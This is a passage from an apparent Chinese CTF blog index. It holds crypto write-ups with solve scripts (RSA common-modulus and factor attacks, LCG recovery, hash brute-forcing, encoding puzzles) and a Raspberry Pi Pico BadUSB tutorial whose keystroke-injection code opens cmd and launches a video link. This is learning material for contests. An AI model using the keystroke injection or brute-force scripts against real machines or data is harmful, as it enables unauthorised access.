144471983652821947847253052623701746810204736865723159569786739658583884214397562204788127484897909964898113250509653721265240138487697822089282456150238116811225975640330930854549232972314642221382625614304415750165289831040623741828600283778523993251940904896081111235859249916040849697146542311990869696453s,s1,s2 = gmpy2.gcdext(e1,e2)m=(pow(c1,s1,n)*pow(c2,s2,n))%nprint(long_to_bytes(m)) Level_2 题目： 12345678910111213141516# 猜猜我是谁 猜对了直接秒出flag喔from Crypto.Util.number import bytes_to_long, getPrimefrom secret import getflagp = ***q = getPrime(1024)e = you guess!n = p * qm = bytes_to_long(getflag().encode())c=pow(m, e, n)print(q)print(c)#p=one of ps#q=145721736470529261146573065574028992352505611489859183763269215489708531333597694809923949026781460438320576519639268582565188719134157402292313959218961804213310847081787824780075530751842057663327444602428455144829447776271394663729996984613471623158126083062443634493708467568220146024273763894704649472957#c=17441814714407189483380175736850663249578989775568187792928771544069162420510939242665830363276698262009780462912108642025299275146709817979705069095332726251759039923303627023610865046363171692163473939115438686877494878334016463787558794121885354719336139401336137097548305393030069499625065664884238710759260231321106291200849044147840392021931720902340003746946851806025722944795391356835342258387797980787437188976704677008092850181043891802072500430200735973581081228711070923822341261809453662427341958883142789220800541626034573952425948295446202775198692920613709157662831071515700549093766182579873408465779#flag=NSSCTF&#123;*&#125; 思路： 根据题目，q已给出，p为ps.txt其中一个素数，那就遍历ps中的素数，判断是否是NSSCTF开头，即可得到flag exp： 1234567891011121314151617181920from Crypto.Util.number import *from decimal import Decimalimport sysimport gmpy2sys.set_int_max_str_digits(1000000000)with open(&quot;ps.txt&quot;,&quot;r&quot;) as f: data = f.readlines()q=145721736470529261146573065574028992352505611489859183763269215489708531333597694809923949026781460438320576519639268582565188719134157402292313959218961804213310847081787824780075530751842057663327444602428455144829447776271394663729996984613471623158126083062443634493708467568220146024273763894704649472957c=17441814714407189483380175736850663249578989775568187792928771544069162420510939242665830363276698262009780462912108642025299275146709817979705069095332726251759039923303627023610865046363171692163473939115438686877494878334016463787558794121885354719336139401336137097548305393030069499625065664884238710759260231321106291200849044147840392021931720902340003746946851806025722944795391356835342258387797980787437188976704677008092850181043891802072500430200735973581081228711070923822341261809453662427341958883142789220800541626034573952425948295446202775198692920613709157662831071515700549093766182579873408465779for i in data: p = i.strip() p = gmpy2.mpz(p) q = gmpy2.mpz(q) n = gmpy2.mul(p, q) phi = gmpy2.mul((p-1),(q-1)) d = inverse(65537,phi) m = pow(c,d,n) if b&#x27;NSSCTF&#x27; in long_to_bytes(m): print(long_to_bytes(m)) 总结： 因为p*q后数值太大，需要用gmpy2的大数计算功能 Level_3 思路： 根据题目，需要使用pwntools连接，连接后计算665个共模攻击的计算，得到flag exp： 12345678910111213141516171819202122232425262728293031from Crypto.Util.number import *import gmpy2from pwn import *import ren_obj = re.compile(r&#x27;n=(.*?)e1&#x27;)e1_obj = re.compile(r&#x27;e1=(.*?)e2&#x27;)e2_obj = re.compile(r&#x27;e2=(.*?)c1&#x27;)c1_obj = re.compile(r&#x27;c1=(.*?)c2&#x27;)c2_obj = re.compile(r&#x27;c2=(.*?)[+]&#x27;)io = remote(&quot;node1.anna.nssctf.cn&quot;,28598)data = io.recvuntil(&#x27;:&#x27;)for i in range(666): data = str(data) n = int(n_obj.findall(data)[0].replace(r&#x27; &#x27;, &#x27;&#x27;)) e1 = int(e1_obj.findall(data)[0].replace(r&#x27; &#x27;, &#x27;&#x27;)) e2 = int(e2_obj.findall(data)[0].replace(r&#x27; &#x27;, &#x27;&#x27;)) c1 = int(c1_obj.findall(data)[0].replace(r&#x27; &#x27;, &#x27;&#x27;)) c2 = int(c2_obj.findall(data)[0].replace(r&#x27; [&#x27;, &#x27;&#x27;)) s,s1,s2 = gmpy2.gcdext(e1,e2) m=(pow(c1,s1,n)*pow(c2,s2,n))%n io.send(long_to_bytes(m)) if i == 665: data = io.recvline() data = io.recvline() data = io.recvline() print(data) else: data = io.recvuntil(&#x27;[+] Pl Give Me flaag :&#x27;) print(data) 总结： 刚得到flag发现比赛结束一分钟了[悲伤]","tags":["CTF","NSSCCTF_Round_#17","Writeup"],"categories":["Writeup"]},{"title":"BadUSB-树莓派pico","path":"/posts/53a3192e.html","content":"下载固件等 1.CircuitPython UF2文件 https://circuitpython.org/board/raspberry_pi_pico/ 2.Adafruit_CircuitPython库 https://github.com/adafruit/Adafruit_CircuitPython_Bundle/releases/latest 3.pico-ducky https://github.com/dbisu/pico-duckyh、https://pico.org.cn/ 烧录固件，写代码 按住Pico的BOOTSEL按钮，将Pico插入电脑 将.UF2文件放入Pico的文件夹，放入后Pico会断开连接，待固件烧录后重新恢复连接。 随后将 adafruit-circuitpython-bundle文件下的lib文件夹中的5个文件复制入Pico的lib文件中 新建code.py文件内容如下 123456789101112131415161718192021import timefrom adafruit_hid.keyboard import Keyboardfrom adafruit_hid.keyboard_layout_us import KeyboardLayoutUSfrom adafruit_hid.keycode import Keycodeimport usb_hidkeyboard = Keyboard(usb_hid.devices)keyboard_layout = KeyboardLayoutUS(keyboard)keyboard.press(Keycode.GUI, Keycode.R)keyboard.release_all()time.sleep(0.5)keyboard_layout.write(&quot;cmd&quot;)time.sleep(0.5) keyboard.release_all()keyboard.press(Keycode.ENTER)keyboard.release(Keycode.ENTER)time.sleep(0.5)keyboard_layout.write(&quot;start https://www.bilibili.com/video/BV1GJ411x7h7&quot;)time.sleep(0.5)keyboard.press(Keycode.ENTER)keyboard.release(Keycode.ENTER) 暂未解决 Pico插入电脑后被识别为U盘，影响使用","tags":["网络安全"]},{"title":"ISCTF-Crypto-WP","path":"/posts/31ff99f1.html","content":"Crypto 七七的欧拉 解题人：g0ubu1i 分解n后发现为某数的次方 根据欧拉定理，phi=p8 - p7，求得d解出题 123456789101112from Crypto.Util.number import *from gmpy2 import *e=8401285423075497989963572888601376313375827722858883767564499066473101615084214973041844878664837606157257039358849583049856161628241418012475432529735909ncp = 90043967260093945222624152587689121936371930974666442796337497007806436220933640104101224556701782897110707124711581073042785835680900647501045466519201150330902139448582877574558481499349246396434566916237734745291901204887326075328782341527220826176727297933741479223587035887696689567725839887008586221103phi = p**8 - p**7d = gmpy2.invert(e,phi)print(long_to_bytes(pow(c,d,n))) 夹里夹气 解题人：dmw 题目提示摩斯密码，看摩斯密码表 根据flag外壳可以推断 嘤嘤？=. 嘤嘤嘤=- 得到 解密得到flag：ISCTF{HSBDH_SFJ_JDNFJ_DJNFJDM} easy_rsa 解题人：g0ubu1i 获取附件后nc连接，得到pqec，编写脚本求m 12345678910from Crypto.Util.number import *from gmpy2 import *p=167561191404321668748830155982148128078094297761744585473561597817468679161266224937726777063364341455943741358249714181954186947851755403287400313044668068915799453457253339629929712548154901350977293977396925064084110789695911728228292958713708869220389929513985054498626193204179190043233878936508865839033q=158850164670351411226854199870571072891191250008284001651273515387478727731321002321763694826236623788860130822650234773829136028319501896718021031170321199126229125742927056311652861918625254681349069189136573855288383606649620226798427177954527952663485539668001819685952435682898253076761435373461926046137e=65537c=4242413297580463331572289283614465576920321904916668533268592047566389769615853283522402653147881010365969562119872301345718233952127637191547842532720861202915213183417888317518184193386552827375852739915676012379130542280256557996822960648308856834792396590872307646080450688311758622439062833141968275861674897506922516574551903131353406719045301549179127740987746392700068342699602004118628459557889230235166487708932077823995407170566299934821909316066022781254941124247363837047877775106189816885421001854139347246364493895035678034310316567263582591786939062838380261769117834938911059384946629475006205178429d = inverse(e, (p-1)*(q-1))print(long_to_bytes(pow(c, d, p*q))) 得到flag rsa_d 解题人：g0ubu1i nc连接靶机后要求计算d 写脚本 123456789from Crypto.Util.number import *from gmpy2 import *p=43625867q=5050993e=65537d = inverse(e, (p-1)*(q-1))print(d) ezRSA(τ) 解题人：g0ubu1i step1: 1234567891011121314151617def step1(m):\tp,q = getPrime(1024),getPrime(1024)\tn=p*q\te=getPrime(512)\tphi = (p-1)*(q-1)\twhile gcd(e,phi) != 1: e=getPrime(512)\td = pow(e,-1,phi)\tk = randint(800,1500)\tf = factor(k)\t# print(f&quot; &#123;k=&#125; &quot;)\tleak = (pow(e, 2) + (e*d - 1)*f)*getPrime(256) + k # (e**2 + (e*d-1)*k!)*x + k print(f&quot;&#123;n=&#125;&quot;)\tprint(f&quot;&#123;leak=&#125;&quot;)\te = 65537\tc = pow(m,e,n)\treturn c 根据output.txt我们有n，c，leak，而leak等于 ![](D:\\blog\\hexo-blog\\source_posts\\ISCTF-Crypto-WP\\3011dd7c7fb1be06026dcfd5f4dd1514.svg#card=math&amp;code=leak %3D (pow(e%2C2)%2B(e^d - 1)f)getPrime(256) %2B k&amp;id=ReRjY) 且phi = ed - 1，f为k的阶乘 由于给定的k的范围比较小，所以可以爆破k。 给leak%f后得到 由此确定e2s为1280位且不是素数 由推导 由此确定e**2s为1280位且不是素数 由上述条件可得到确定e的条件，写代码 123456789for k in range(800, 1042): f = int(factor(k)) e2_s = (leak-k) % int(f) phis = (leak -k - e2_s) // f s = GCD(tphi,e2_s) if e2s.bit_length() == 1280 and isPrime(e2s)==False and s.bit_length()&gt;=255: print(k) print(s) 即可得到k，s，继续推导可得到phi与e 由此解出第一部分 step2： 首先考察LCG算法，由LCG算法恢复出p 1234567891011121314151617181920212223242526272829303132333435363738from Crypto.Util.number import *from random import randint,getrandbitsfrom sympy import factorial as factorfrom gmpy2 import is_prime as is_strongPrimefrom gmpy2 import gcdfrom libnum import s2nfrom Crypto.Util.number import *def gcd(a,b): if(b==0): return a else: return gcd(b,a%b) leak2 = [362437850887271063413256292444148642949623196635276044583204094265607936120337004605360832421011, 1932915843524327487337992118762711929552569713433223514001673251237692307587356544615955431611435994003602897830069566867051943572065473955405337889221398, 11222178024143398739150445814520244630341642052876364179793404105841311693968292227072031763726153574031884490677131749512430325919668649359617953965112844, 5408933876805830533113961512210040977462510675785228477646978801328722923647434079128879371684477664804744431834418916837956820965870203842552250165916773, 1447143741705069323823257922715038721270982554690635708441585728089036094805730054505696492295730683300002193478561819037345041940787115528445592303142510, 3707657531268843465369646969917923274507341341483950204025637357600814449263032574496424566705812439915548150679438579110456264431525526309588664326456861, 9263925820149827740182684692442727161206242182976684575667062235695526783971703826794731732152445051579616121306722939129265340347908823003172137299057843, 207494591333501391015462321304802957885928775185602834554977737560856036337667840127810136802887548047878444936730742505483927963807357904024967768148122, 7052936859446617933917872361389151092893299250603966165472023802877016733939957851026719428770748111897050866474067880613419756475700748999497496482278608, 1169538791889404037461397919075674424569430764451305755000680272926397357803359328850780774937432248011264334398346178303234064891680342161511829008635621]t = []for i in range(9): t.append(leak2[i]-leak2[i-1]) all_n = []for i in range(7): all_n.append(gcd((t[i+1]*t[i-1]-t[i]*t[i]), (t[i+2]*t[i]-t[i+1]*t[i+1]))) MMI = lambda A, n,s=1,t=0,N=0: (n &lt; 2 and t%N or MMI(n, A%n, t, s-A//n*t, N or n),-1)[n&lt;1] #逆元计算for p in all_n: p=abs(p) if p==1: continue a=(leak2[2]-leak2[1])*MMI((leak2[1]-leak2[0]),p)%p ani=MMI(a,p) b=(leak2[1]-a*leak2[0])%p seed = (ani*(leak2[0]-b))%p plaintext=seed q = n // p if plaintext.bit_length() &gt;= 63 and leak1-p-q==0: #continue print(a) print(b) print(p) print(seed) 通过得到的a，b，seed重新计算seed 1234567a = 77103936782340200964969557381530979461498267151335748569651214009683718895787b = 80415964905483336441916158760498483436647287707097172421898625062076211518999seed = 4700640019334050676leak2 = []for i in range(10): leak2.append(seed := (seed * a + b) % p)seed = (seed * a + b) % p 接着爆破key得到key 1234for key in trange(60000000+1,10**8 //2+1,-2): if is_prime(key) and not is_strongPrime(key): print(key) break 拿到key后可求得base，通过final求得c，求解c得到后半段密文 1234567891011key = 56052361base = key ^ seede=0x10001d = inverse(e,(p-1)*(q-1))final = [2268617516274900905319941795987877533673889507146326516564545408684476960310333170888941124460992562245780101836116975666368936099249664924148379487909122, 1445275952377746701088629016221431744592935398639655895336779954310077866709012082302847692239730041591520169244063854849129773530127510048494782550102381, 7]c = 0u = 0for i in final: c += final * (base ** u) u += 1print(long_to_bytes(pow(c,d,n))) signin 解题人：g0ubu1i 考点：Schmidt-Samoa密码系统 12345678from Crypto.Util.number import *c = 29897791365314067508830838449733707533227957127276785142837008063510003132596050393885548439564070678838696563164574990811756434599732001622138564176327233154381380717648392357672642893142367607369679906940371540867456654151408884171467638060523066406441697453971996011548195499549200103123841556085936672833238264876038160712793697159776332101536779874757463509294968879216810485825310481778472384531442206034564488532399171243463881900578407746982324779260941957792455217641883334131366614310644607114128868153897806362954456585661855569432513785225453501792356175649676419772626548071916379318631677869452985829916084336045071072493567871623113923140668031380684940109024609167449291380675124701557542736834722898328082888430566229322840781411336263268594978558564310744076581639469210462567543585251718744340216155557606004995449505782302864725856877289388008819135023371948017425832082773421030256964953984562211638060N = 3231913372897424708803097969843687520868057190788284975066875241636436021279559026753076528399891936983240045179193386905918743759145596242896507856007669217275515235051689758768735530529408948098860529277921046146065473333357110158008648799207873976745048714516868561754202543130629713461365314627535982379718931633528922076268531363809414255082933615667770491818402126891370106045838695484124212397783571579791558324350069782623908757815983802849109451590357380624488436968737140312471089662428308113246310588336044438265822574558816510054763215983649467009345458480077882624118620789015758507736272402998721366662352794082495441303895025585316667229865533166614969641012195668280586477033200418153345241668242651407009849656745509386158276185301334443855737552801531617549980843398648751032649895403939319648954908487619711555700124294191702406981128355348449748466449951568451135718146828444185238617155432417897711198169d = 220908195398117048628110042133057032501548264225985823161565460390793825899523662424732910718579350524590368287207857059670558852106434615134645183432670023784725430385048028248108677670095524205518013647694485975996499747580966911259433184798952372110628624294686853944766950244209186984164963987120416687012811346656498861438432610431705868541829977481875385468143747334359481673214618931159403123892213161430602430294790913847722073762999311674428134241956293914716183107414340330449465142849402354034926378025006749405210014879947411570380433942279355488861684317611066949685697268714760755591128598654573304969l = pow(2,N*d,N)-2x=GCD(N,pow(2,l))print(long_to_bytes(pow(c,d,x))) 得到flag","tags":["Writeup","ISCTF"],"categories":["Writeup"]},{"title":"SHCTF2023","path":"/posts/4e08d874.html","content":"SHCTF2023 Crypto [WEEK1]Crypto_Checkin 下载附件后得到题目 1QZZ|KQbjRRS8QZRQdCYwR4_DoQ7~jyO&gt;0t4R4__aQZQ9|Rz+k_Q!r#mR90+NR4_4NR%&gt;ipO&gt;0s&#123;R90|SQhHKhRz+k^S8Q5JS5|OUQZO&#125;CQfp*dS8P&amp;9R8&gt;k?QZYthRz+k_O&gt;0#&gt; 使用CyberChef进行解密，发现为4层解密。分别为base85,base64,base32,hex,得到flag base85解密结果为 1R1kzRE1RWldHRTNET04yQ0dVMkRNT0JUR0UzVEdOS0dHTVlUT01aVklZMkRFTVpVRzRaVEdNWlZJWVpUR05TRkdZWlRHTUJXR1FaVEdOMkU= base64解密结果为 1GY3DMQZWGE3DON2CGU2DMOBTGE3TGNKGGMYTOMZVIY2DEMZUG4ZTGMZVIYZTGNSFGYZTGMBWGQZTGN2E base32解密结果为 1666C61677B546831735F31735F423473335F336E633064337D hex解密结果为 1flag&#123;Th1s_1s_B4s3_3nc0d3&#125; [WEEK1]残缺的md5 123苑晴在路边捡到了一张纸条，上面有一串字符串：KCLWG?K8M9O3?DE?84S9问号是被污染的部分，纸条的背面写着被污染的地方为大写字母，还给了这串字符串的md5码值：F0AF????B1F463????F7AE???B2AC4E6请提交完整的md5码值并用flag&#123;&#125;包裹提交 拿到题目后发现为根据得到的字符串匹配md5，思路为使用python遍历大写字母后组成字符串，进行md5加密。再得到符合要求的md5值 12345678910111213import hashlibstr_value = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;for i in str_value: for j in str_value: for m in str_value: flag = &quot;KCLWG&quot; + i + &quot;K8M9O3&quot; + j + &quot;DE&quot; + m+ &quot;84S9&quot; obj = hashlib.md5() obj.update(flag.encode(&quot;utf-8&quot;)) result = obj.hexdigest().upper() if &quot;F0AF&quot; in result and &quot;B1F463&quot; in result: print(result) 得到md5值为\tF0AF1443B1F463EAFFF7AEBB8B2AC4E6 [WEEK1]凯撒大帝 1pvkq&#123;mredsrkyxkx&#125; 根据题目提示，加密方式为凯撒加密使用CyberChef解密 位移为16，解密结果为 1flag&#123;chutihaonan&#125; [WEEK1]进制 12好熟悉的进制，但不知道加密了几层3636366336313637376236313638363636623661366336383662363136383764 根据题目怀疑为hex 第一层解密后得到 1666c61677b6168666b6a6c686b61687d 第二层解密后得到 1flag&#123;ahfkjlhkah&#125; [WEEK1]okk 题目： 12345678910111213141516171819202122Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook! Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook!Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook!Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook!Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook! Ook. Ook. Ook.Ook! Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook! Ook. Ook.Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook.Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook?Ook. 通过okk解密后得到 1flag&#123;123456789&#125; [WEEK1]熊斐特 题目： 12熊斐特博士发现了一种新的密码。uozt&#123;zgyzhs xrksvi&#125; 根据题目，加密为埃特巴什码 解密后得到 1flag&#123;atbash cipher&#125; [WEEK1]迷雾重重 题目: 12345678题目描述：morse？ASCII？密文：0010 0100 01 110 1111011 11 111 010 000 0 001101 00 000 001101 0001 0 010 1011 001101 0010 001 10 1111101 根据题目尝试通过摩斯密码解密得到 1flag&#123;morse_is_very_fun&#125; [WEEK1]难言的遗憾 12345678题目描述：我们本可以早些进入信息化时代的，但是清政府拒不采纳那份编码规则。 （注：flag为中文，使用flag&#123;&#125;包裹提交）密文：000111310008133175592422205314327609650071810649 根据题目猜测为中文电码，解密后得到 1一天不学高数我就魂身难受 [WEEK1] 小兔子可爱捏 123题目描述：宇宙的终极答案是什么？U2FsdGVkX1/lKCKZm7Nw9xHLMrKHsbGQuFJU5QeUdASq3Ulcrcv9你可能会需要一把钥匙，钥匙就是问题的答案。 根据题目判断为rabbit加密，密钥为42 解码后得到 1flag&#123;i_love_technology&#125; [WEEK1] what is m 1234567from Crypto.Util.number import bytes_to_longfrom secret import flagm = bytes_to_long(flag)print(&quot;m =&quot;,m)# m = 7130439814059477413771863538044548993245251660073838020411807105607801507451075252124658989164881490641702328395728224520288268685033299812787734568748819610532741806627627101671065156596093 根据题目，将flag由bytes转为long，想获得flag只需将m由long转bytes 12345678910from Crypto.Util.number import bytes_to_long, long_to_bytes&quot;&quot;&quot;from secret import flagm = bytes_to_long(flag)print(&quot;m =&quot;,m) &quot;&quot;&quot;m = 7130439814059477413771863538044548993245251660073838020411807105607801507451075252124658989164881490641702328395728224520288268685033299812787734568748819610532741806627627101671065156596093flag = long_to_bytes(m)print(&quot;flag:&quot;, flag) 得到flag为 1flag&#123;ther3_are_SeVeRA1_a1TeRNat1VES_to_TH3_1ON6_t0_8yteS_fuNc7l0n_24A9B2EF44d1&#125; [WEEK1]黑暗之歌 题目： 1⠴⡰⡭⡳⠴⡰⡭⡰⡷⡲⡢⡩⡭⡡⠯⡩⡭⡡⡺⡩⡭⡡⠳⡩⡭⡡⡺⡩⡭⡡⡶⡩⡭⡡⡶⡩⡭⡡⡲⡩⡭⡡⡺⡩⡭⡡⠯⡩⡧⡊⡢⡩⡭⡡⠯⡩⡭⡡⡺⡃⡰⠫⡋⡚⡲⡍⡋⡮⠴⡰⡭⡶⡷⡲⡢⡩⡧⡊⡢⡃⡴⡵⡋⡁⡬⡵⡋⡁⡬⡵⡋⡁⡬⡳⡋⠲⠴⡯⡃⡗⠴⡰⡭⡴⠴⡰⡭⡶⡷⡲⡢⡩⡧⡊⡢⡩⡭⡡⡺⡩⡭⡡⡺⡩⡭⡡⠳⡩⡧⡊⡢⡩⡭⡡⠯⡩⡧⡊⡢⡃⡴⡵⡋⡚⡱⠫⡋⡚⡱⠫⡋⡚⡲⠵⠲⡺⠰⠽ 经过盲文解码后（解码网站） 14pms4pmpwrbima/imazima3imazimavimavimarimazima/igJbima/imazCp+KZrMKn4pmvwrbigJbCtuKAluKAluKAlsK24oCW4pmt4pmvwrbigJbimazimazima3igJbima/igJbCtuKZq+KZq+KZrz0= base64解密之后 1♬♩¶♯♬♭♬♫♫♪♬♯‖♯♬§♬§♯¶‖¶‖‖‖¶‖♭♯¶‖♬♬♭‖♯‖¶♫♫♯= 音符密码解密之后 1flag&#123;b2cc-9091-8a29&#125; [WEEK1] really_ez_rsa 题目 123456789101112131415161718from Crypto.Util.number import getPrime, bytes_to_longe = 65537m = b&#x27;&#x27;p = getPrime(128)q = getPrime(128)n = p * qm = bytes_to_long(m)c = pow(m, e, n)print(&quot;p =&quot;, p)print(&quot;q =&quot;, q)print(&quot;c =&quot;, c)print(&quot;e =&quot;, e)# p = 217873395548207236847876059475581824463# q = 185617189161086060278518214521453878483# c = 6170206647205994850964798055359827998224330552323068751708721001188295410644# e = 65537 题目中给出了qpec，直接写出解密脚本解密 1234567891011121314from Crypto.Util.number import long_to_bytesimport gmpy2p = 217873395548207236847876059475581824463q = 185617189161086060278518214521453878483c = 6170206647205994850964798055359827998224330552323068751708721001188295410644e = 65537phi = (p-1)*(q-1)d = gmpy2.invert(e,phi)m = gmpy2.powmod(c,d,p*q)print(long_to_bytes(m)) 得到flag为 1flag&#123;Y0ung_meiyou_xiaojj&#125; [WEEK2] 哈希猫 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051import hashlibfrom secret import flagassert flag[:5] == &quot;flag&#123;&quot;assert flag[-1:] == &quot;&#125;&quot;flag = flag[5:-1]assert len(flag) == 43print(hashlib.sha224(flag[0:2].encode()).hexdigest())print(hashlib.sha256(flag[2:4].encode()).hexdigest())print(hashlib.sha1(flag[4:7].encode()).hexdigest())print(hashlib.sha1(flag[7:10].encode()).hexdigest())print(hashlib.sha512(flag[10:12].encode()).hexdigest())print(hashlib.md5(flag[12:15].encode()).hexdigest())print(hashlib.sha256(flag[15:17].encode()).hexdigest())print(hashlib.sha384(flag[17:19].encode()).hexdigest())print(hashlib.sha256(flag[19:21].encode()).hexdigest())print(hashlib.sha256(flag[21:23].encode()).hexdigest())print(hashlib.sha256(flag[23:25].encode()).hexdigest())print(hashlib.sha512(flag[25:27].encode()).hexdigest())print(hashlib.sha224(flag[27:29].encode()).hexdigest())print(hashlib.sha384(flag[29:31].encode()).hexdigest())print(hashlib.md5(flag[31:34].encode()).hexdigest())print(hashlib.sha512(flag[34:36].encode()).hexdigest())print(hashlib.sha224(flag[36:38].encode()).hexdigest())print(hashlib.sha256(flag[38:40].encode()).hexdigest())print(hashlib.sha512(flag[40:42].encode()).hexdigest())print(hashlib.md5(flag[42:43].encode()).hexdigest())# 705460fa432983620cfdf55397e43161edf3367cdafe157ca0b46bc6# ec61c8382b2d371090060b081d3c567f022bb6defd91e9defcbbe0787f080882# 2b3e56ece4f0b1dadf21c5f01c1cd1124bdbbe45# d309bebf43d3cdf7dfd1bc7e1de16f8b5b12deac# e91e6821acdad6a65eff85d9d0b11df30392ce5f1c424058bce0029bf390d923d43d6d1ab3d84a638712bba566cbb18743ed372aa1c95ec7c83177d74e60cb20# 90f80fa3a342375d71f427bf2fd61cd2# ef2a3319810f3ae9cd5948f3229bc195d7b1558846487473b21a842f9d1b503b# b655988f676a1494a400c8acead965a04b828e9538887e471a7985a12523cbe8027b838b49e7c548b43a633dfa81b010# 688c5a4a65af33d6ddb7a8cb8e0d934e42d0f417a1b0fb6f755e050aa15a9dae# fdee4726c2847c8788b39cb69f2777cf672711bb11d9622b07f0fe23fac1480e# 051603900bc7a27051b385299b0ef6c3dd2da3c6216845df7f501d9e4337cbcd# 38f3476fe78a5ac95ed2e2da792de22645c92f1466b30704c6d8d5d725325da9c742c5e8a3704caaea8b19d4b211780d32b7658958b6bb3f58f6f868f86e522c# b162f6c91e9d02b7eba0c8dc0d4b0ac20002d47bcafa29699a54a682# 34cfd54dcf443a572cbfa7c1cb90af1b580b98d4d42274ea3c99c25390065a985c81354ddc2e54e243f5be21b90f435b# 50680fbb1bc80ff7ac8d5cdd0bee77fd# 5b1fac8ceb254baeb8a794c105ef61f99b59d592ad1803b614be85fe12311a9b68307570f4e996fb20dbe82e2fcd65b0da16ecfa5577cebf178e0beabe271112# a715591d887d66ed248ae4cc5aea34995d2feeb1130de534a7ecfdde# 472e73d796e20aa8ff9059e6316f218e0322548f661ec4dc267507ed66317404# d364a863110f07538a9f0e6b1e42b382979a7b26a53a554ecd35b8f08634ee8067119c4ddc48b9b1a0f6c266fdaeb698dfda95f122b2314e55700aa244fbe138# 45c48cce2e2d7fbdea1afc51c7c6ad26 根据题目，由于flag被分为多组进行加密，所以每次hash加密是明文的长度很小，所以考虑进行爆破 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118import hashlibstr_list = &quot;0123456789!#$%&amp;&#x27;()*+-/=&lt;&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz_&quot;str_listt = []for i in str_list: for j in str_list: strw = i + j str_listt.append(strw)for i in str_listt: if hashlib.sha224(i.encode()).hexdigest() == &quot;705460fa432983620cfdf55397e43161edf3367cdafe157ca0b46bc6&quot;: a1 = i else: passfor i in str_listt: if hashlib.sha256(i.encode()).hexdigest() == &quot;ec61c8382b2d371090060b081d3c567f022bb6defd91e9defcbbe0787f080882&quot;: a2 = i else: pass for i in str_list: for j in str_list: for m in str_list: n = i + j + m if hashlib.sha1(n.encode()).hexdigest() == &quot;2b3e56ece4f0b1dadf21c5f01c1cd1124bdbbe45&quot;: a3 = n else: passfor i in str_list: for j in str_list: for m in str_list: n = i + j + m if hashlib.sha1(n.encode()).hexdigest() == &quot;d309bebf43d3cdf7dfd1bc7e1de16f8b5b12deac&quot;: a4 = n else: pass for i in str_listt: if hashlib.sha512(i.encode()).hexdigest() == &quot;e91e6821acdad6a65eff85d9d0b11df30392ce5f1c424058bce0029bf390d923d43d6d1ab3d84a638712bba566cbb18743ed372aa1c95ec7c83177d74e60cb20&quot;: a5 = i else: pass for i in str_list: for j in str_list: for m in str_list: n = i + j+ m if hashlib.md5(n.encode()).hexdigest() == &quot;90f80fa3a342375d71f427bf2fd61cd2&quot;: a6 = n else: pass for i in str_listt: if hashlib.sha256(i.encode()).hexdigest() == &quot;ef2a3319810f3ae9cd5948f3229bc195d7b1558846487473b21a842f9d1b503b&quot;: a7 = i else: pass for i in str_listt: if hashlib.sha384(i.encode()).hexdigest() == &quot;b655988f676a1494a400c8acead965a04b828e9538887e471a7985a12523cbe8027b838b49e7c548b43a633dfa81b010&quot;: a8 = i else: passfor i in str_listt: if hashlib.sha256(i.encode()).hexdigest() == &quot;688c5a4a65af33d6ddb7a8cb8e0d934e42d0f417a1b0fb6f755e050aa15a9dae&quot;: a9 = i else: passfor i in str_listt: if hashlib.sha256(i.encode()).hexdigest() == &quot;fdee4726c2847c8788b39cb69f2777cf672711bb11d9622b07f0fe23fac1480e&quot;: a10 = i else: passfor i in str_listt: if hashlib.sha256(i.encode()).hexdigest() == &quot;051603900bc7a27051b385299b0ef6c3dd2da3c6216845df7f501d9e4337cbcd&quot;: a11 = i else: passfor i in str_listt: if hashlib.sha512(i.encode()).hexdigest() == &quot;38f3476fe78a5ac95ed2e2da792de22645c92f1466b30704c6d8d5d725325da9c742c5e8a3704caaea8b19d4b211780d32b7658958b6bb3f58f6f868f86e522c&quot;: a12 = i else: passfor i in str_listt: if hashlib.sha224(i.encode()).hexdigest() == &quot;b162f6c91e9d02b7eba0c8dc0d4b0ac20002d47bcafa29699a54a682&quot;: a13 = i else: passfor i in str_listt: if hashlib.sha384(i.encode()).hexdigest() == 